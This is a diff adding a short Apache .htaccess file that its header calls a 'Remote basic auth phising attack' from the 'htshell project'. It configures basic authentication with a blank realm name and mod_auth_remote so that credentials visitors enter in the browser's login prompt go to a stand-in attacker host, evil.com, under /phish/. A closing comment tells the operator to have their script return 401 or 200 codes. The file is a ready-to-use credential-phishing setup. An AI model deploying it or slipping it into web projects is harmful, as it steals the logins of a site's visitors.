@@ -1,0 +1,11 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Remote basic auth phising attack - Part of the htshell project.
+
+AuthType           Basic
+AuthName           ""
+AuthRemoteServer   evil.com
+AuthRemotePort     80
+AuthRemoteURL      /phish/
+require            valid-user
+
+# Your script need to return the corresponding 401 or 200 ok response codes to the mod_auth_remote module.
